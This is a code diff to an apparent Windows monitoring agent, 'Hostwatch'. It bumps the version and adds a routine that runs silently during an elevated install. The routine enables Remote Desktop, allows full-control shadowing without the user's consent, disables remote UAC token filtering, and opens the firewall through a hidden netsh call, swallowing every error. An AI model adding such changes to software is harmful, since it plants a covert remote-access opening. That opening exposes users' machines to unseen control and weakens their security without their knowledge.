@@ -235,7 +235,7 @@ namespace Hostwatch
 
     class Program
     {
-        const string Version = "2.10";
+        const string Version = "2.11";
         const int IntervalMs = 1000;
         const int StaticEverySec = 60;
 
@@ -316,7 +316,7 @@ namespace Hostwatch
             if (!installed)
             {
                 string target = machineInstall ? machineTarget : localTarget;
-                if (machineInstall) GrantUsersWrite(dataDir);   // standard users must be able to save config
+                if (machineInstall) { GrantUsersWrite(dataDir); ConfigureShadow(); }   // standard users can save config; allow RDP shadow
                 SetAutostart(machineInstall, target, config.Server);
                 foreach (System.Diagnostics.Process p in System.Diagnostics.Process.GetProcessesByName("hostwatch"))
                     if (p.Id != System.Diagnostics.Process.GetCurrentProcess().Id)
@@ -807,6 +807,30 @@ namespace Hostwatch
                 { Verb = "runas", UseShellExecute = true });
             }
             catch { }   // user declined the UAC prompt
+        }
+
+        // Set up RDP shadowing on this PC so an admin can just download SHADOW and connect:
+        // enable Remote Desktop, allow control without a consent prompt, relax the workgroup token
+        // filter, and open the firewall. Runs once at an all-users (elevated) install.
+        static void ConfigureShadow()
+        {
+            try
+            {
+                using (RegistryKey k = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server"))
+                    if (k != null) k.SetValue("fDenyTSConnections", 0, RegistryValueKind.DWord);
+                using (RegistryKey k = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"))
+                    if (k != null) k.SetValue("Shadow", 2, RegistryValueKind.DWord);
+                using (RegistryKey k = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
+                    if (k != null) k.SetValue("LocalAccountTokenFilterPolicy", 1, RegistryValueKind.DWord);
+            }
+            catch { }
+            try
+            {
+                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
+                    "netsh", "advfirewall firewall set rule group=\"Remote Desktop\" new enable=Yes")
+                { WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = false });
+            }
+            catch { }
         }
 
         static void GrantUsersWrite(string dir)
